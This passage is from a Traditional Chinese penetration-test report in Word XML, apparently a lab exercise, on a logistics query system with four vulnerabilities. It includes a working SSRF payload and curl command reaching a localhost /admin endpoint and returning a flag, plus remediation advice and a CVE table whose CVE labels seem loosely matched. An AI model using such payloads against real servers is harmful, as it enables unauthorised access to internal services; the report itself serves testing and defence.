          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>嘗試訪問本機的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> /admin </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>端點</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>成功繞過</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>檢查，取得僅限內部存取的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> Flag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>攻擊</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> Payload</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>http://127.0.0.1:5000/fetch?url=http://loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>alhost:5000/admin</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>測試結果截圖</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="400" w:right="400"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>$ curl -s "http://localhost:5000/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>fetch?url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>=http://localhost:5000/admin"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;pre&gt;&lt;pre&gt;FLAG{ssrf_cve_2021_26855}&lt;/pre&gt;&lt;/pre&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>請在此處</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>插入截圖</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>修補建議</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A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實施嚴格的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>驗證，封鎖</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> Loopback</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>、私有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>等</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>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Allowlist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限制可訪問的域名或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>禁止請求指向本機服務</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>考慮使用獨立的代理服務或網</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>路隔離</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>四、漏洞彙整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36"/>
        <w:gridCol w:w="1440"/>
        <w:gridCol w:w="1439"/>
        <w:gridCol w:w="1439"/>
        <w:gridCol w:w="1438"/>
        <w:gridCol w:w="1438"/>
      </w:tblGrid>
      <w:tr w:rsidR="006559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>#</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>端點</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>漏洞類型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>CVE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>風險等級</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>是否已修補</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>/track</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>Command Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2026-39808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>嚴重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>☐</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>/download</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>Path Traversal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2021-41773</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>高</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>☐</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>/greet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>SSTI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2022-22963</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>嚴重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>☐</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006559D2">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>/fetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>SSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>CVE-2021-26855</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>高</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1440" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
            <w:r>
              <w:t>☐</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:t>五、結論與建議</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>整體風險評估</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>竹流物</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>流查詢系統目前存在四個嚴重安全漏洞，整體風險等級為極高（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>Critical</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>）。其中兩個漏洞（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">Command Injection </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSTI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>）允許攻擊者完全控制伺服器，可執行任意系統命令或讀取應用程式敏感資訊。另外兩個漏洞（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">Path Traversal </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-TW"/>
        </w:rPr>
        <w:t>）雖風險稍低，但仍可導致敏感資訊洩漏和內部網路滲透。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>優先修補順序</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t>1. Command Injection (/track)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. SSTI (/greet)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>3. Path Traversal (/download)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">4. SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>(/fetch)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>防禦策略建議</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>輸入驗證與過濾框架</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Web </w:t>
      </w:r>
      <w:r>
        <w:t>應用防火牆</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (WAF)</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>最小權限原則</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:t>安全的編碼實踐</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">5. </w:t>
      </w:r>
      <w:r>
        <w:t>安全標頭與配置</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">6. </w:t>
      </w:r>
      <w:r>
        <w:t>定期安全測試</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">7. </w:t>
      </w:r>
      <w:r>
        <w:t>日誌監控與警報</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006559D2" w:rsidRDefault="004A3A00">
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:t>報告生成日期：</w:t>
      </w:r>
      <w:r>
        <w:t>2026</w:t>
      </w:r>
      <w:r>
        <w:t>年</w:t>
      </w:r>
      <w:r>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:t>月</w:t>
      </w:r>
      <w:r>
        <w:t>30</w:t>
      </w:r>
      <w:r>
        <w:t>日</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00655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54E"/>
    <w:rsid w:val="004A3A00"/>
    <w:rsid w:val="006559D2"/>
    <w:rsid w:val="007806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E31C8"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{8B88D1D9-2DD1-41CC-8594-EE7633EF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A1EE10-08AD-4336-8C9F-C5FBB6405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2026-04-30T04:51:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-30T04:51:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>